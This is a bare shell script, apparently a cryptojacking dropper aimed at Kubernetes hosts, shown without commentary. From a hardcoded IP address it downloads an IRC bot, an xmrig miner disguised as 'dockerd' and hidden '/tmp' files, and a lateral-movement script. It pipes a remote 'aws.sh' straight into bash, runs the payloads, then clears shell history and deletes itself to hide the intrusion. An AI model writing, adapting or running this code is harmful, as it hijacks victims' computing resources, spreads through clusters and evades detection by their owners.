
rm -f /tmp/.x1mr
rm -f /tmp/.x2mr

IRCZIG="http://45.9.148.85/chimaera/bin/64bit/TNT_Kubernetes_e_u"
XMRBIN="http://45.9.148.85/chimaera/bin/64bit/xmrig"

if type wget 2>/dev/null 1>/dev/null; then 
timeout -s SIGKILL 60 wget $IRCZIG -O /tmp/.systemct
timeout -s SIGKILL 60 wget http://45.9.148.85/chimaera/sh/kube.lateral.sh -O /tmp/.kl
timeout -s SIGKILL 60 wget $XMRBIN -O /tmp/.kernel
timeout -s SIGKILL 60 wget -O - http://45.9.148.85/aws.sh | bash
elif type curl 2>/dev/null 1>/dev/null; then 
timeout -s SIGKILL 60 curl -Lk $IRCZIG -o /tmp/.systemct
timeout -s SIGKILL 60 curl http://45.9.148.85/chimaera/sh/kube.lateral.sh -o /tmp/.kl
timeout -s SIGKILL 60 curl -Lk $XMRBIN -o /tmp/.kernel
timeout -s SIGKILL 60 curl http://45.9.148.85/aws.sh | bash
fi

if [ ! -d "/usr/local/sbin/" ]; then mkdir -p /usr/local/sbin/ 2>/dev/null; fi
if [ ! -f "/usr/local/sbin/dockerd" ];then wget -q http://45.9.148.85/chimaera/bin/xmr/$(uname -m) -O /usr/local/sbin/dockerd; fi
if [ ! -f "/usr/local/sbin/dockerd" ];then curl -s http://45.9.148.85/chimaera/bin/xmr/$(uname -m) -o /usr/local/sbin/dockerd; fi
chmod +x /usr/local/sbin/dockerd
/usr/local/sbin/dockerd




chmod +x /tmp/.systemct
chmod +x /tmp/.kernel
cd /tmp/
./.systemct
nice -n -20 ./.kernel ; ./.kernel
bash /tmp/.kl &
rm -f /tmp/.kl
history -c
clear

rm -f $0
